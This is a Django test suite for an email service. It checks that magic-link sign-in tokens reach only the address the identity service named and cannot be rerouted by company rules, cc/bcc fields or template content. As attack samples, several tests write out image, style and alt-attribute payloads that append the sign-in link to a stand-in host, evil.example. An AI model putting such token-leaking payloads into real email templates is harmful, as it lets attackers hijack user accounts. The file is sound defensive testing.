"""A sign-in link only ever goes to the address identity sent it for.

Company email rules cannot subscribe to auth-lane events, cannot change who receives
them, and an auth copy cannot carry the link anywhere a mail client would fetch it.
"""

from __future__ import annotations

from django.core.cache import cache
from django.test import TestCase, override_settings
from rest_framework.test import APIClient

from apps.authapi.principal import EmailPrincipal
from apps.email.crypto import encrypt_json
from apps.email.keys import issue_service_key
from apps.email.models import CompanyProvider, EmailRule, EmailTemplate, LibraryTemplate, Message
from apps.providers.registry import fake_provider

MAGIC = 'identity.auth.magic_link.requested'
INVITED = 'identity.user.invited'
LINK = 'https://id.shellui.com/api/v1/magic-link/verify?token=staff-secret-token'
SECRET = 'staff-secret-token'


def _owner(company_id, email='owner@acme.com'):
    client = APIClient()
    client.force_authenticate(
        user=EmailPrincipal(user_id=3, company_id=company_id, email=email, is_company_owner=True)
    )
    return client


def _button(href='{{ magic_link_url }}', text='Sign in'):
    return {'type': 'button', 'attrs': {'href': href}, 'content': [{'type': 'text', 'text': text}]}


@override_settings(
    EMAIL_DELIVER_SYNC=True,
    EMAIL_FALLBACK_PROVIDER='fake',
    EMAIL_ALLOW_FAKE_PROVIDER=True,
    EMAIL_AUTH_LINK_HOSTS=['id.shellui.com'],
    EMAIL_PUBLIC_URL='https://mail.shellui.test',
    DEBUG=True,
)
class AuthLinkRecipientTests(TestCase):
    def setUp(self):
        cache.clear()
        fake_provider().sent.clear()
        self.owner = _owner(40)
        self.identity_key, _client = issue_service_key(
            service='identity',
            allowed_lanes=['auth', 'transactional'],
            allowed_template_prefixes=['identity.'],
        )
        CompanyProvider.objects.create(
            company_id=40,
            provider='fake',
            from_email='ops@acme.com',
            from_name='Acme',
            credentials_ciphertext=encrypt_json({'marker': 'company'}, setting='EMAIL_CREDENTIALS_KEY'),
            credentials_hint='••••test',
            configured=True,
        )

    def _identity(self):
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.identity_key}')
        return client

    def _builtin(self, event_type=MAGIC):
        rules = self.owner.get('/api/v1/rules?company_id=40&service=identity').json()['rules']
        return next(row for row in rules if row['event_type'] == event_type and row['built_in'])

    def _library_id(self, key='barebone.activation'):
        return LibraryTemplate.objects.get(key=key).pk

    def _post_magic_event(self, recipients):
        return self._identity().post(
            '/api/v1/events',
            {
                'company_id': 40,
                'service': 'identity',
                'event_type': MAGIC,
                'payload': {'company_name': 'Acme', 'magic_link_url': LINK},
                'recipients': recipients,
            },
            format='json',
        )

    def _direct_send(self, to):
        return self._identity().post(
            '/api/v1/send',
            {
                'company_id': 40,
                'template_key': MAGIC,
                'to': to,
                'variables': {'company_name': 'Acme', 'magic_link_url': LINK},
            },
            format='json',
        )

    def _leaked_to(self, address):
        return [
            message
            for message in fake_provider().sent
            if message.to_email.lower() == address and (SECRET in message.html or SECRET in message.text or SECRET in message.subject)
        ]

    def test_owner_cannot_create_a_rule_on_the_magic_link_event(self):
        for event_type in (MAGIC, INVITED):
            with self.subTest(event_type=event_type):
                refused = self.owner.post(
                    '/api/v1/rules?company_id=40',
                    {
                        'event_type': event_type,
                        'recipient_mode': 'static',
                        'static_recipients': ['owner@acme.com'],
                        'content': {'library_id': self._library_id()},
                    },
                    format='json',
                )
                self.assertEqual(refused.status_code, 400, refused.content)
                self.assertEqual(refused.json()['error_code'], 'auth_event_rule_forbidden')
                self.assertEqual(refused.json()['field_errors'], {'event_type': ['auth_event']})
                self.assertFalse(EmailRule.objects.filter(company_id=40, event_type=event_type, built_in=False).exists())

    def test_owner_cannot_point_the_builtin_rule_at_another_address(self):
        rule = self._builtin()
        for body in (
            {'recipient_mode': 'static', 'static_recipients': ['owner@acme.com']},
            {'recipient_mode': 'static'},
            {'static_recipients': ['owner@acme.com']},
        ):
            with self.subTest(body=body):
                refused = self.owner.patch(f'/api/v1/rules/{rule["id"]}?company_id=40', body, format='json')
                self.assertEqual(refused.status_code, 409, refused.content)
                self.assertEqual(refused.json()['error_code'], 'rule_built_in')
        stored = EmailRule.objects.get(pk=rule['id'])
        self.assertEqual((stored.recipient_mode, stored.static_recipients), ('hints', []))
        kept = self.owner.patch(
            f'/api/v1/rules/{rule["id"]}?company_id=40',
            {'recipient_mode': 'hints', 'static_recipients': [], 'language': 'fr'},
            format='json',
        )
        self.assertEqual(kept.status_code, 200, kept.content)

    def test_legacy_rules_and_overrides_never_receive_the_link(self):
        """Rows written before the API refused them: an owner rule and a static built-in."""
        builtin = EmailRule.objects.get(pk=self._builtin()['id'])
        EmailRule.objects.filter(pk=builtin.pk).update(recipient_mode='static', static_recipients=['owner@acme.com'])
        legacy_template = EmailTemplate.objects.create(
            template_key='company.legacy', company_id=40, language='en', event_type=MAGIC
        )
        legacy = EmailRule.objects.create(
            company_id=40,
            service='identity',
            event_type=MAGIC,
            enabled=True,
            template=legacy_template,
            recipient_mode='static',
            static_recipients=['owner@acme.com', 'spy@evil.example'],
            built_in=False,
        )
        sent = self._post_magic_event([{'email': 'staff@shellui.com'}])
        self.assertEqual(sent.status_code, 202, sent.content)
        self.assertEqual([m['to'] for m in sent.json()['messages']], ['staff@shellui.com'])
        self.assertEqual(self._leaked_to('owner@acme.com'), [])
        self.assertEqual(self._leaked_to('spy@evil.example'), [])
        self.assertEqual(len(self._leaked_to('staff@shellui.com')), 1)
        self.assertFalse(Message.objects.filter(to_email__in=['owner@acme.com', 'spy@evil.example']).exists())
        patched = self.owner.patch(f'/api/v1/rules/{legacy.pk}?company_id=40', {'enabled': True}, format='json')
        self.assertEqual(patched.status_code, 400, patched.content)
        self.assertEqual(patched.json()['error_code'], 'auth_event_rule_forbidden')
        self.assertEqual(self.owner.delete(f'/api/v1/rules/{legacy.pk}?company_id=40').status_code, 204)

    def test_auth_event_goes_to_exactly_one_recipient(self):
        refused = self._post_magic_event([{'email': 'staff@shellui.com'}, {'email': 'owner@acme.com'}])
        self.assertEqual(refused.status_code, 400, refused.content)
        self.assertEqual(refused.json()['error_code'], 'auth_single_recipient')
        self.assertEqual(fake_provider().sent, [])

    def test_direct_auth_send_goes_to_exactly_one_recipient(self):
        refused = self._direct_send([{'email': 'staff@shellui.com'}, {'email': 'owner@acme.com'}])
        self.assertEqual(refused.status_code, 400, refused.content)
        self.assertEqual(refused.json()['error_code'], 'auth_single_recipient')
        self.assertEqual(fake_provider().sent, [])
        sent = self._direct_send([{'email': 'staff@shellui.com'}])
        self.assertEqual(sent.status_code, 202, sent.content)
        self.assertEqual([message.to_email for message in fake_provider().sent], ['staff@shellui.com'])

    def test_direct_send_ignores_rules_and_unknown_recipient_fields(self):
        EmailRule.objects.filter(pk=self._builtin()['id']).update(
            recipient_mode='static', static_recipients=['owner@acme.com']
        )
        sent = self._identity().post(
            '/api/v1/send',
            {
                'company_id': 40,
                'template_key': MAGIC,
                'to': [{'email': 'staff@shellui.com'}],
                'cc': [{'email': 'owner@acme.com'}],
                'bcc': [{'email': 'owner@acme.com'}],
                'reply_to': 'owner@acme.com',
                'variables': {'company_name': 'Acme', 'magic_link_url': LINK},
            },
            format='json',
        )
        self.assertEqual(sent.status_code, 202, sent.content)
        self.assertEqual([message.to_email for message in fake_provider().sent], ['staff@shellui.com'])
        self.assertNotIn('owner@acme.com', repr(fake_provider().sent[0].headers))

    def test_direct_send_uses_the_builtin_copy_not_a_legacy_owner_copy(self):
        legacy_template = EmailTemplate.objects.create(
            template_key='company.legacy', company_id=40, language='en', event_type=MAGIC, active_version=1
        )
        legacy_template.versions.create(
            number=1,
            state='published',
            subject='Legacy {{ magic_link_url }}',
            html='<img src="https://evil.example/p.gif?u={{ magic_link_url }}">',
            text='x',
        )
        EmailRule.objects.filter(company_id=40, event_type=MAGIC).delete()
        sent = self._direct_send([{'email': 'staff@shellui.com'}])
        self.assertEqual(sent.status_code, 202, sent.content)
        self.assertNotIn('evil.example', fake_provider().sent[-1].html)

    def test_auth_copy_cannot_carry_the_link_in_an_image_or_attribute(self):
        rule = self._builtin()
        template_id = rule['template_id']
        attacks = {
            'image_src': {'type': 'image', 'attrs': {'src': 'https://evil.example/p.gif?u={{ magic_link_url }}'}},
            'image_src_default': {
                'type': 'image',
                'attrs': {'src': 'https://evil.example/p.gif?u={{ magic_link_url|default:"x" }}'},
            },
            'image_src_spacing': {'type': 'image', 'attrs': {'src': 'https://evil.example/p.gif?u={{magic_link_url}}'}},
            'style': {
                'type': 'paragraph',
                'attrs': {'style': 'background-image:url(https://evil.example/p.gif?u={{ magic_link_url }})'},
                'content': [{'type': 'text', 'text': 'Hi'}],
            },
            'mark_style': {
                'type': 'paragraph',
                'content': [
                    {
                        'type': 'text',
                        'text': 'Hi',
                        'marks': [{'type': 'preservedStyle', 'attrs': {'style': 'background:url({{ magic_link_url }})'}}],
                    }
                ],
            },
            'alt': {'type': 'image', 'attrs': {'src': 'https://evil.example/logo.png', 'alt': '{{ magic_link_url }}'}},
        }
        for name, node in attacks.items():
            with self.subTest(attack=name):
                draft = self.owner.post(
                    f'/api/v1/templates/{template_id}/versions',
                    {'subject': 'Sign in', 'document': {'type': 'doc', 'content': [_button(), node]}},
                    format='json',
                )
                self.assertEqual(draft.status_code, 201, draft.content)
                refused = self.owner.post(f'/api/v1/templates/{template_id}/versions/{draft.json()["number"]}/publish')
                self.assertEqual(refused.status_code, 400, refused.content)
                self.assertEqual(refused.json()['error_code'], 'auth_link_misplaced')
        self._direct_send([{'email': 'staff@shellui.com'}])
        self.assertNotIn('evil.example', fake_provider().sent[-1].html)

    def test_auth_copy_keeps_the_link_in_a_button_and_text(self):
        rule = self._builtin()
        template_id = rule['template_id']
        document = {
            'type': 'doc',
            'content': [
                _button(),
                {'type': 'paragraph', 'content': [{'type': 'text', 'text': 'Or paste {{ magic_link_url }}'}]},
                {'type': 'image', 'attrs': {'src': '{{ system.assets_url }}/logo.png', 'href': '{{ magic_link_url }}'}},
            ],
        }
        draft = self.owner.post(
            f'/api/v1/templates/{template_id}/versions',
            {'subject': 'Sign in to {{ company_name }}', 'document': document},
            format='json',
        )
        self.assertEqual(draft.status_code, 201, draft.content)
        published = self.owner.post(f'/api/v1/templates/{template_id}/versions/{draft.json()["number"]}/publish')
        self.assertEqual(published.status_code, 200, published.content)

    def test_catalog_marks_auth_events_closed_to_company_rules(self):
        events = {row['event_type']: row for row in self.owner.get('/api/v1/catalog').json()['events']}
        self.assertFalse(events[MAGIC]['rules_allowed'])
        self.assertFalse(events[INVITED]['rules_allowed'])
        self.assertTrue(events['hosting.deployment.failed']['rules_allowed'])

    def test_non_auth_rule_context_never_has_the_link(self):
        rule = self.owner.post(
            '/api/v1/rules?company_id=40',
            {
                'event_type': 'identity.user.created',
                'recipient_mode': 'static',
                'static_recipients': ['owner@acme.com'],
                'content': {'library_id': self._library_id('barebone.text-only')},
            },
            format='json',
        )
        self.assertEqual(rule.status_code, 201, rule.content)
        template_id = rule.json()['template_id']
        draft = self.owner.post(
            f'/api/v1/templates/{template_id}/versions',
            {
                'subject': 'New user {{ magic_link_url|default:"none" }}',
                'document': {
                    'type': 'doc',
                    'content': [{'type': 'paragraph', 'content': [{'type': 'text', 'text': 'L {{ magic_link_url }} {{ token }}'}]}],
                },
            },
            format='json',
        )
        self.owner.post(f'/api/v1/templates/{template_id}/versions/{draft.json()["number"]}/publish')
        sent = self._identity().post(
            '/api/v1/events',
            {
                'company_id': 40,
                'service': 'identity',
                'event_type': 'identity.user.created',
                'payload': {'company_name': 'Acme', 'magic_link_url': LINK, 'token': SECRET, 'raw_token': SECRET},
                'recipients': [{'email': 'ada@acme.com'}],
            },
            format='json',
        )
        self.assertEqual(sent.status_code, 202, sent.content)
        self.assertEqual(len(fake_provider().sent), 1)
        self.assertEqual(self._leaked_to('owner@acme.com'), [])


@override_settings(
    EMAIL_DELIVER_SYNC=True,
    EMAIL_FALLBACK_PROVIDER='fake',
    EMAIL_ALLOW_FAKE_PROVIDER=True,
    EMAIL_AUTH_LINK_HOSTS=['id.shellui.com'],
    EMAIL_PUBLIC_URL='https://mail.shellui.test',
    DEBUG=True,
)
class PublishedBeforeTheChecksTests(TestCase):
    """A built-in copy published before the image check is not sent. The default design is."""

    def setUp(self):
        cache.clear()
        fake_provider().sent.clear()
        self.identity_key, _client = issue_service_key(
            service='identity',
            allowed_lanes=['auth'],
            allowed_template_prefixes=['identity.'],
        )

    def test_direct_send_falls_back_to_the_default_design(self):
        from apps.email.rules import ensure_builtin_rules

        ensure_builtin_rules(40)
        rule = EmailRule.objects.get(company_id=40, event_type=MAGIC, built_in=True)
        template = rule.template
        number = template.active_version + 1
        template.versions.create(
            number=number,
            state='published',
            subject='Sign in',
            document={
                'type': 'doc',
                'content': [
                    _button(),
                    {'type': 'image', 'attrs': {'src': 'https://evil.example/p.gif?u={{ magic_link_url }}'}},
                ],
            },
            html='<a href="{{ magic_link_url }}">Sign in</a><img src="https://evil.example/p.gif?u={{ magic_link_url }}">',
            text='Sign in {{ magic_link_url }}',
        )
        template.versions.exclude(number=number).update(state='archived')
        template.active_version = number
        template.save(update_fields=['active_version'])
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.identity_key}')
        sent = client.post(
            '/api/v1/send',
            {
                'company_id': 40,
                'template_key': MAGIC,
                'to': [{'email': 'staff@shellui.com'}],
                'variables': {'company_name': 'Acme', 'magic_link_url': LINK},
            },
            format='json',
        )
        self.assertEqual(sent.status_code, 202, sent.content)
        message = fake_provider().sent[-1]
        self.assertNotIn('evil.example', message.html)
        self.assertIn(SECRET, message.html)


class LockAuthRulesMigrationTests(TestCase):
    def test_migration_resets_builtin_recipients_and_disables_company_rules(self):
        import importlib

        from django.apps import apps as django_apps

        migration = importlib.import_module('apps.email.migrations.0011_auth_rules_locked')
        template = EmailTemplate.objects.create(template_key='company.a', company_id=41, language='en', event_type=MAGIC)
        other = EmailTemplate.objects.create(template_key='company.b', company_id=41, language='en', event_type=MAGIC)
        hosting = EmailTemplate.objects.create(
            template_key='company.c', company_id=41, language='en', event_type='hosting.deployment.failed'
        )
        builtin = EmailRule.objects.create(
            company_id=41, service='identity', event_type=MAGIC, template=template, built_in=True,
            recipient_mode='static', static_recipients=['owner@acme.com'],
        )
        owned = EmailRule.objects.create(
            company_id=41, service='identity', event_type=MAGIC, template=other, built_in=False,
            recipient_mode='static', static_recipients=['owner@acme.com'],
        )
        untouched = EmailRule.objects.create(
            company_id=41, service='hosting', event_type='hosting.deployment.failed', template=hosting,
            recipient_mode='static', static_recipients=['ops@acme.com'],
        )
        migration.lock_auth_rules(django_apps, None)
        builtin.refresh_from_db()
        owned.refresh_from_db()
        untouched.refresh_from_db()
        self.assertEqual((builtin.recipient_mode, builtin.static_recipients, builtin.enabled), ('hints', [], True))
        self.assertFalse(owned.enabled)
        self.assertEqual((untouched.static_recipients, untouched.enabled), (['ops@acme.com'], True))
